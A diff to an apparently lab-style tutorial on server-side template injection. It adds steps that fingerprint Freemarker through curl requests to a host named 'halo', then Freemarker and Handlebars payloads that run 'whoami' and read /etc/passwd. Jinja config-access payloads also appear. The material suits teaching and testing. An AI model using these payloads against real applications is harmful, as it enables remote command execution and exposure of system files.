@@ -174,9 +174,6 @@ Another indicator we can leverage is accessing global variables. These variables
 {{ config.flag }}
 ```
 
-
-
-
 ```jinja
 {{config.items()}} # Flask-specific
 ```
@@ -198,6 +195,10 @@ Another indicator we can leverage is accessing global variables. These variables
 {{#each (readdir "/etc")}}
    {{this}}
 {{/each}}
+```
+
+```handlebars
+{{read "/etc/passwd"}}
 ```
 
 ```handlebars
@@ -229,6 +230,54 @@ Another indicator we can leverage is accessing global variables. These variables
 <#assign x = "freemarker.template.utility.Execute"?new()>
 ${x("cat /flag")}
 ```
+
+The expression in the template was translated to the static variable. Given the file extension and the style of expression, we can assume that this is using the Freemarker templating engine. Let's perform some additional tests to verify this. We'll start by using double curly-brackets to multiply a number. If we are indeed working with Freemarker, we expect that this won't do much since these are not the delimiters that it uses. Let's add this payload to the end of the template. 
+
+```freemaker
+{{5*5}}
+```
+
+We'll click save on this document and use curl to review the output.
+
+```shell
+curl -L http://halo/DoesNotExist
+```
+
+As expected, the value is not rendered. Let's try replacing the double curly-brackets with the default Freemarker delimiter.
+
+```freemaker
+${5*5}
+```
+
+```shell
+curl -L http://halo/DoesNotExist
+``` 
+
+Next, let's try to change one of the numbers from an integer to a string. If an error is returned, this will confirm that the templating engine is Freemarker. In some cases, this test might crash the entire application, so we should proceed cautiously.
+
+```fremaker
+${5*'5'}
+```
+
+This time, we'll send a request and display the headers (with -i) so that we can examine the response code.
+
+```shell
+curl -L http://halo/DoesNotExist -i
+```
+
+The response indicates that multiplying a string and integer crashed the templating engine. At this point, we are very confident we're working with the Freemarker templating engine.
+
+Let's build a payload that will execute commands on the target. We'll start by reviewing the rudimentary Freemarker expression to execute a command.
+
+```html
+${"freemarker.template.utility.Execute"?new()("whoami")}
+```
+ or 
+
+```shell
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+```
+
 
 ---
 
